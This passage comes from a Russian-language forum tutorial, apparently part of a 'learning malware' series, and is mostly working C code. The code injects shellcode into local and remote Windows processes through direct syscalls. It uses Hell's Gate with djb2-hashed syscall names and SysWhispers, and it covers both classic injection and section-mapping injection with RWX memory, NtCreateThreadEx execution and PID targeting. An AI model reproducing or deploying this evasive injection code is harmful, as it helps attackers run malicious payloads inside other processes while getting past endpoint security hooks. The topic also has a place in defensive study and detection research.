    if ((STATUS = HellDescent(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
        printf(&quot;[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        printf(&quot;[i] Bytes Written : %d of %d \n&quot;, sNumberOfBytesWritten, sPayloadSize);
        return FALSE;
    }
    printf(&quot;[+] DONE \n&quot;);

//--------------------------------------------------------------------------

    // Changing the memory&#039;s permissions to RWX
    HellsGate(pVxTable-&gt;NtProtectVirtualMemory.wSystemCall);
    if ((STATUS = HellDescent(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
        printf(&quot;[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

//--------------------------------------------------------------------------
    // Executing the payload via thread
    printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
    getchar();
    printf(&quot;\t[i] Running Thread Of Entry 0x%p ... &quot;, pAddress);
    HellsGate(pVxTable-&gt;NtCreateThreadEx.wSystemCall);
    if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] DONE \n&quot;);
    printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));


    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Обновление структуры</b> <b>VX_TABLE</b><br />
<br />
Далее необходимо обновить структуру VX_TABLE с именами системных вызовов, используемых в этом модуле, как показано ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _VX_TABLE {
    VX_TABLE_ENTRY NtAllocateVirtualMemory;    // Элемент таблицы для системного вызова
    VX_TABLE_ENTRY NtWriteVirtualMemory;       // Элемент таблицы для системного вызова
    VX_TABLE_ENTRY NtProtectVirtualMemory;     // Элемент таблицы для системного вызова
    VX_TABLE_ENTRY NtCreateThreadEx;           // Элемент таблицы для системного вызова
} VX_TABLE, * PVX_TABLE;</code></pre>
	</div>
</div><br />
<b>Обновление значения Seed Value</b><br />
<br />
Будет использовано новое значение <b>Seed Value</b> для замены старого, чтобы изменить хэш-значения системных вызовов. Функция хэширования djb2 обновляется новым значением <b>Seed Value </b>ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>DWORD64 djb2(PBYTE str) {
    DWORD64 dwHash = 0x77347734DEADBEEF; // Старое значение: 0x7734773477347734
    INT c;

    while (c = *str++)
        dwHash = ((dwHash &lt;&lt; 0x5) + dwHash) + c;

    return dwHash;
}</code></pre>
	</div>
</div><br />
Теперь необходимо сгенерировать хэш-значений djb2 для функций (Напишите консольную программу например):<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtAllocateVirtualMemory&quot;, &quot;_djb2&quot;, (DWORD64)djb2(&quot;NtAllocateVirtualMemory&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtWriteVirtualMemory&quot;, &quot;_djb2&quot;, djb2(&quot;NtWriteVirtualMemory&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtProtectVirtualMemory&quot;, &quot;_djb2&quot;, djb2(&quot;NtProtectVirtualMemory&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtCreateThreadEx&quot;, &quot;_djb2&quot;, djb2(&quot;NtCreateThreadEx&quot;));</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746786813914.png"
		data-src="https://osint42.org/attachments/1746786813914-png.233/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746786813914-png.233/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786813914.png"
			title="1746786813914.png"
			width="1341" height="120" loading="lazy" />
	</div><br />
<br />
Как только значения сгенерированы, добавьте их в начало проекта Hell&#039;s Gate.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>#define NtAllocateVirtualMemory_djb2  0x7B2D1D431C81F5F6
#define NtWriteVirtualMemory_djb2     0x54AEE238645CCA7C
#define NtProtectVirtualMemory_djb2   0xA0DCC2851566E832
#define NtCreateThreadEx_djb2         0x2786FB7E75145F1A</code></pre>
	</div>
</div><br />
<b>Обновление главной функции</b><br />
<br />
Главная функция (<a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L49" target="_blank" class="link link--external" rel="noopener">wmain</a>) должна быть обновлена (На код ниже), чтобы вызывать ClassicInjectionViaSyscalls вместо <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L80" target="_blank" class="link link--external" rel="noopener">payload function</a>. Функция будет использовать выше сгенерированные хэши, как показано ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>INT main() {
    // Getting the PEB structure
    PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
    PPEB pCurrentPeb = pCurrentTeb-&gt;ProcessEnvironmentBlock;
    if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb-&gt;OSMajorVersion != 0xA)
        return 0x1;

    // Getting the NTDLL module
    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);

    // Getting the EAT of Ntdll
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
    if (!GetImageExportDirectory(pLdrDataEntry-&gt;DllBase, &amp;pImageExportDirectory) || pImageExportDirectory == NULL)
        return 0x01;

//--------------------------------------------------------------------------
    // Initializing the &#039;Table&#039; structure
    VX_TABLE Table = { 0 };
    Table.NtAllocateVirtualMemory.dwHash = NtAllocateVirtualMemory_djb2;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtAllocateVirtualMemory))
        return 0x1;

    Table.NtWriteVirtualMemory.dwHash = NtWriteVirtualMemory_djb2;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtWriteVirtualMemory))
        return 0x1;

    Table.NtProtectVirtualMemory.dwHash = NtProtectVirtualMemory_djb2;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtProtectVirtualMemory))
        return 0x1;

    Table.NtCreateThreadEx.dwHash = NtCreateThreadEx_djb2;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtCreateThreadEx))
        return 0x1;

//--------------------------------------------------------------------------
    // injection code - calling the &#039;ClassicInjectionViaSyscalls&#039; function


// If local injection
#ifdef LOCAL_INJECTIONif (!ClassicInjectionViaSyscalls(&amp;Table, (HANDLE)-1, Payload, sizeof(Payload)))
        return 0x1;
#endif // LOCAL_INJECTION// If remote injection
#ifdef REMOTE_INJECTION// Open a handle to the target process
    printf(&quot;[i] Targeting process of id : %d \n&quot;, PROCESS_ID);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PROCESS_ID);
    if (hProcess == NULL) {
        printf(&quot;[!] OpenProcess Failed With Error : %d \n&quot;, GetLastError());
        return -1;
    }

    if (!ClassicInjectionViaSyscalls(&amp;Table, hProcess, Payload, sizeof(Payload)))
        return 0x1;

#endif // REMOTE_INJECTIONreturn 0x00;
}</code></pre>
	</div>
</div><br />
<b>Локальная и удаленная инъекция </b><br />
<br />
Поскольку реализованная функция ClassicInjectionViaSyscalls может работать как на уровне локального процесса, так и на уровне удаленного процесса, был построен макрокод препроцессора для целевого локального процесса, если определено LOCAL_INJECTION.<br />
<br />
Код препроцессора показан ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define LOCAL_INJECTION
#ifndef LOCAL_INJECTION
#define REMOTE_INJECTION
// Устанавливаем идентификатор целевого процесса PID
#define PROCESS_ID    18784
#endif // !LOCAL_INJECTION</code></pre>
	</div>
</div><br />
#define LOCAL_INJECTION можно закомментировать, чтобы нацелиться на удаленный процесс. В этом случае будет целевым процесс с PID, равным PROCESS_ID.<br />
Если #define LOCAL_INJECTION не закомментирован, что является настройкой по умолчанию в предоставленном коде, то используется псевдо-дескриптор локального процесса, равный (HANDLE)-1.<br />
<br />
<b>Демо<br />
<br />
Использование реализации SysWhispers локально.</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786830441.png"
		data-src="https://osint42.org/attachments/1746786830441-png.234/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746786830441-png.234/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786830441.png"
			title="1746786830441.png"
			width="1836" height="911" loading="lazy" />
	</div><br />
<br />
<b>Использование реализации SysWhispers удаленно</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786836575.png"
		data-src="https://osint42.org/attachments/1746786836575-png.235/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746786836575-png.235/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786836575.png"
			title="1746786836575.png"
			width="1872" height="806" loading="lazy" />
	</div><br />
<br />
<b>Использование реализации Hell&#039;s Gate локально.</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786842948.png"
		data-src="https://osint42.org/attachments/1746786842948-png.236/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746786842948-png.236/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786842948.png"
			title="1746786842948.png"
			width="1753" height="871" loading="lazy" />
	</div><br />
<br />
<b>Использование реализации Hell&#039;s Gate удаленно.</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786849444.png"
		data-src="https://osint42.org/attachments/1746786849444-png.237/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746786849444-png.237/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786849444.png"
			title="1746786849444.png"
			width="1830" height="763" loading="lazy" />
	</div><br />
<br />
<br />
<b>Давайте теперь перепишем эту технику:</b> Инъекция отображаемой памяти | Цикл статей &quot;Изучение вредоносных программ&quot;<br />
<br />
<b>Введение</b><br />
<br />
В этой части техника инъекции маппинга, обсуждаемая ранее, будет реализована с помощью прямых системных вызовов, заменяя WinAPI на их эквивалент системных вызовов:<br />
<br />
CreateFileMapping заменяется на NtCreateSection<br />
<br />
MapViewOfFile заменяется на NtMapViewOfSection<br />
<br />
CloseHandle заменяется на NtClose<br />
<br />
UnmapViewOfFile заменяется на NtUnmapViewOfSection<br />
<br />
<b>Параметры Syscall</b><br />
<br />
В этом разделе будут рассмотрены системные вызовы, которые будут использоваться, и их параметры будут объяснены.<br />
<br />
<b>NtCreateSection</b><br />
<br />
Это результирующий системный вызов из CreateFileMapping WinAPI. NtCreateSection показан ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtCreateSection(
OUT PHANDLE SectionHandle, // Указатель на переменную HANDLE, которая получает дескриптор объекта секции
IN ACCESS_MASK DesiredAccess, // Тип прав доступа к дескриптору секции
IN POBJECT_ATTRIBUTES ObjectAttributes, // Указатель на структуру OBJECT_ATTRIBUTES (установить в NULL)
IN PLARGE_INTEGER MaximumSize, // Максимальный размер секции
IN ULONG SectionPageProtection, // Защита, которая будет установлена на каждой странице в секции
IN ULONG AllocationAttributes, // Атрибуты выделения секции (флаги SEC_XXX)
IN HANDLE FileHandle // Опционально указывает дескриптор открытого файла (установить в NULL)
);</code></pre>
	</div>
</div><br />
Хотя между NtCreateSection и CreateFileMapping есть много схожего, некоторые параметры новые. Во-первых, параметр DesiredAccess описывает тип прав доступа к дескриптору секции. Список параметров показан на изображении ниже.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786888790.png"
		data-src="https://osint42.org/attachments/1746786888790-png.238/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746786888790-png.238/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786888790.png"
			title="1746786888790.png"
			width="1043" height="435" loading="lazy" />
	</div><br />
<br />
В этом модуле достаточно использовать либо SECTION_ALL_ACCESS, либо SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE.<br />
<br />
Далее, параметр MaximumSize - это указатель на структуру LARGE_INTEGER. Единственный элемент, который нужно заполнить, это элемент LowPart, который будет равен размеру полезной нагрузки. Структура LARGE_INTEGER показана ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef union _LARGE_INTEGER {
struct {
DWORD LowPart;
LONG HighPart;
} DUMMYSTRUCTNAME;
struct {
DWORD LowPart;
LONG HighPart;
} u;
LONGLONG QuadPart;
} LARGE_INTEGER;</code></pre>
	</div>
</div><br />
Наконец, параметр AllocationAttributes определяет битовую маску флагов SEC_XXX, которая определяет атрибуты выделения секции. Список флагов можно найти здесь под параметром flProtect. В этом модуле этот параметр будет установлен в значение SEC_COMMIT.<br />
<br />
<b>NtMapViewOfSection</b><br />
<br />
Это результирующий системный вызов из MapViewOfFile WinAPI. NtMapViewOfSection показан ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtMapViewOfSection(
IN HANDLE SectionHandle, // HANDLE объекта секции, созданного &#039;NtCreateSection&#039;
IN HANDLE ProcessHandle, // Дескриптор процесса, которому нужно отобразить вид
IN OUT PVOID *BaseAddress, // Указатель на переменную PVOID, которая получает базовый адрес отображения
IN ULONG ZeroBits, // установить в NULL
IN SIZE_T CommitSize, // установить в NULL
IN OUT PLARGE_INTEGER SectionOffset, // установить в NULL
IN OUT PSIZE_T ViewSize, // Указатель на переменную SIZE_T, которая содержит размер выделяемой памяти
IN SECTION_INHERIT InheritDisposition, // Как вид должен быть разделен с дочерними процессами
IN ULONG AllocationType, // тип выделения, который будет выполнен (установить в NULL)
IN ULONG Protect // Защита, которая будет установлена на каждой странице в секции
);</code></pre>
	</div>
</div><br />
В этом модуле параметр SectionHandle будет получен из вызова NtCreateSection. Параметр ProcessHandle будет равен текущему дескриптору процесса, который может быть получен с помощью функции GetCurrentProcess.<br />
<br />
Параметр BaseAddress получает базовый адрес отображения. Значение этого параметра будет указано позже.<br />
<br />
Параметр ViewSize содержит размер выделяемой памяти, который будет равен размеру полезной нагрузки.<br />
<br />
Параметр InheritDisposition определяет, как вид должен быть разделен с дочерними процессами. В этом модуле этот параметр будет установлен в значение &#039;ViewUnmap&#039;, что означает, что дочерние процессы не будут иметь доступа к этому виду. Наконец, параметр Protect устанавливает уровень защиты для каждой страницы в секции. В этом модуле этот параметр будет установлен в значение &#039;PAGE_READWRITE&#039;, что означает, что страницы можно будет читать и записывать.<br />
<br />
<b>NtUnmapViewOfSection </b><br />
<br />
Это результирующий системный вызов из UnmapViewOfFile WinAPI. NtUnmapViewOfSection показан ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtUnmapViewOfSection(
IN HANDLE ProcessHandle, // Дескриптор процесса, которому нужно отменить отображение
IN PVOID BaseAddress // Базовый адрес отображения, который был предоставлен ранее
);</code></pre>
	</div>
</div>
	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code></code></pre>
	</div>
</div><br />
В этом модуле параметр ProcessHandle будет равен текущему дескриптору процесса, который может быть получен с помощью функции GetCurrentProcess. Параметр BaseAddress будет базовым адресом отображения, который был предоставлен ранее.<br />
<br />
NtClose Это результирующий системный вызов из CloseHandle WinAPI. NtClose показан ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtClose(
IN HANDLE Handle // Дескриптор, который нужно закрыть
);</code></pre>
	</div>
</div><br />
В этом модуле параметр Handle будет либо дескриптором секции, полученным из вызова NtCreateSection, либо дескриптором процесса, который может быть получен с помощью функции GetCurrentProcess.<br />
<br />
<b>Реализация с использованием GetProcAddress и GetModuleHandle</b><br />
<br />
Следующим шагом является реализация метода инъекции через отображение с использованием ранее показанных системных вызовов. Аналогично предыдущему модулю, метод будет показан тремя способами, начиная с использования GetProcAddress и GetModuleHandle.<br />
<br />
Структура Syscall создается и инициализируется с помощью InitializeSyscallStruct, которая содержит адреса используемых системных вызовов, как показано ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>// структура, используемая для хранения системных вызовов
typedef struct _Syscall {

    fnNtCreateSection       pNtCreateSection;
    fnNtMapViewOfSection    pNtMapViewOfSection;
    fnUnmapViewOfSection    pNtUnmapViewOfSection;
    fnNtClose               pNtClose;
    fnNtCreateThreadEx      pNtCreateThreadEx;

}Syscall, * PSyscall;

// функция, используемая для заполнения входной структуры &#039;St&#039;
BOOL InitializeSyscallStruct (OUT PSyscall St) {

    HMODULE hNtdll    = GetModuleHandle(L&quot;NTDLL.DLL&quot;);
    if (!hNtdll) {
        printf(&quot;[!] GetModuleHandle не удалось. Ошибка: %d \n&quot;, GetLastError());
        return FALSE;
    }

    St-&gt;pNtCreateSection         = (fnNtCreateSection)GetProcAddress(hNtdll, &quot;NtCreateSection&quot;);
    St-&gt;pNtMapViewOfSection      = (fnNtMapViewOfSection)GetProcAddress(hNtdll, &quot;NtMapViewOfSection&quot;);
    St-&gt;pNtUnmapViewOfSection    = (fnUnmapViewOfSection)GetProcAddress(hNtdll, &quot;NtUnmapViewOfSection&quot;);
    St-&gt;pNtClose                 = (fnNtClose)GetProcAddress(hNtdll, &quot;NtClose&quot;);
    St-&gt;pNtCreateThreadEx        = (fnNtCreateThreadEx)GetProcAddress(hNtdll, &quot;NtCreateThreadEx&quot;);

     // проверка, пропустил ли GetProcAddress системный вызов
    if (St-&gt;pNtCreateSection == NULL || St-&gt;pNtMapViewOfSection == NULL || St-&gt;pNtUnmapViewOfSection == NULL || St-&gt;pNtClose == NULL || St-&gt;pNtCreateThreadEx == NULL)
        return FALSE;
    else
        return TRUE;
}</code></pre>
	</div>
</div><br />
Функции LocalMappingInjectionViaSyscalls и RemoteMappingInjectionViaSyscalls отвечают за инъекцию полезной нагрузки (pPayload) в локальный и удаленный процесс (hProcess) соответственно.<br />
Обе функции показаны ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL LocalMappingInjectionViaSyscalls(IN PVOID pPayload, IN SIZE_T sPayloadSize) {

    HANDLE                hSection        = NULL;
    HANDLE                hThread            = NULL;
    PVOID                pAddress        = NULL;
    NTSTATUS            STATUS            = NULL;
    SIZE_T                sViewSize        = NULL;
    LARGE_INTEGER        MaximumSize        = {
            .HighPart = 0,
            .LowPart = sPayloadSize
    };
    Syscall                St                = { 0 };

    // Инициализация структуры &#039;St&#039; для получения адресов системных вызовов
    if (!InitializeSyscallStruct(&amp;St)) {
        printf(&quot;[!] Could Not Initialize The Syscall Struct \n&quot;);
        return FALSE;
    }

//--------------------------------------------------------------------------
    // Выделение локального отображения

    if ((STATUS = St.pNtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
        printf(&quot;[!] NtCreateSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    if ((STATUS = St.pNtMapViewOfSection(hSection, (HANDLE)-1, &amp;pAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
        printf(&quot;[!] NtMapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sViewSize);

//--------------------------------------------------------------------------
    // Запись полезной нагрузки

    printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
    getchar();
    memcpy(pAddress, pPayload, sPayloadSize);
    printf(&quot;\t[+] Payload is Copied From 0x%p To 0x%p \n&quot;, pPayload, pAddress);

//--------------------------------------------------------------------------

    // Выполнение полезной нагрузки с помощью создания потока

    printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
    getchar();
    printf(&quot;\t[i] Running Thread Of Entry 0x%p ... &quot;, pAddress);
    if ((STATUS = St.pNtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] DONE \n&quot;);
    printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));

//--------------------------------------------------------------------------

    // Отключение локального отображения - только после выполнения полезной нагрузки
    if ((STATUS = St.pNtUnmapViewOfSection((HANDLE)-1, pAddress)) != 0) {
        printf(&quot;[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // Закрытие дескриптора секции
    if ((STATUS = St.pNtClose(hSection)) != 0) {
        printf(&quot;[!] NtClose Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

    HANDLE                hSection            = NULL;
    HANDLE                hThread                = NULL;
    PVOID                pLocalAddress        = NULL,
                        pRemoteAddress        = NULL;
    NTSTATUS            STATUS                = NULL;
    SIZE_T                sViewSize            = NULL;
    LARGE_INTEGER        MaximumSize         = {
            .HighPart = 0,
            .LowPart = sPayloadSize
    };
    Syscall                St                    = { 0 };

    // Инициализация структуры &#039;St&#039; для получения адресов системных вызовов
    if (!InitializeSyscallStruct(&amp;St)) {
        printf(&quot;[!] Could Not Initialize The Syscall Struct \n&quot;);
        return FALSE;
    }

    // Выделение отображения в удаленном процессе
    if ((STATUS = St.pNtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
        printf(&quot;[!] NtCreateSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    if ((STATUS = St.pNtMapViewOfSection(hSection, (HANDLE)-1, &amp;pLocalAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
        printf(&quot;[!] NtMapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    printf(&quot;[+] Allocated Local Address At : 0x%p Of Size : %d \n&quot;, pLocalAddress, sViewSize);

    // Запись полезной нагрузки в локальное отображение
    printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
    getchar();
    memcpy(pLocalAddress, pPayload, sPayloadSize);
    printf(&quot;\t[+] Payload is Copied From 0x%p To 0x%p \n&quot;, pPayload, pLocalAddress);

    // Получение адреса в удаленном процессе
    if ((STATUS = St.pNtMapViewOfSection(hSection, hProcess, &amp;pRemoteAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
        printf(&quot;[!] NtMapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] Allocated Remote Address At : 0x%p Of Size : %d \n&quot;, pRemoteAddress, sViewSize);

    // Запуск полезной нагрузки в удаленном процессе
    printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
    getchar();
    printf(&quot;\t[i] Running Thread Of Entry 0x%p In The Remote Process ... &quot;, pRemoteAddress);
    if ((STATUS = St.pNtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] DONE \n&quot;);
    printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));

    // Освобождение локального отображения
    if ((STATUS = St.pNtUnmapViewOfSection((HANDLE)-1, pLocalAddress)) != 0) {
        printf(&quot;[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // Закрытие дескриптора секции
    if ((STATUS = St.pNtClose(hSection)) != 0) {
        printf(&quot;[!] NtClose Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
Функцию NtUnmapViewOfSection следует выполнять только после завершения выполнения полезной нагрузки. Попытка отмены отображения локального представления во время выполнения полезной нагрузки может привести к нарушению выполнения полезной нагрузки или вызвать сбой процесса. В качестве альтернативы можно использовать системный вызов NtWaitForSingleObject для ожидания завершения потока, после чего можно выполнить системный вызов NtUnmapViewOfSection для очистки отображенной полезной нагрузки. Однако это остается на усмотрение читателя.<br />
<br />
<b>Реализация с использованием SysWhispers</b><br />
<br />
В данной реализации используется SysWhispers3 для обхода пользовательских хуков через прямые системные вызовы. Для создания необходимых файлов для этой реализации используется следующая команда.<br />
<br />

	
	



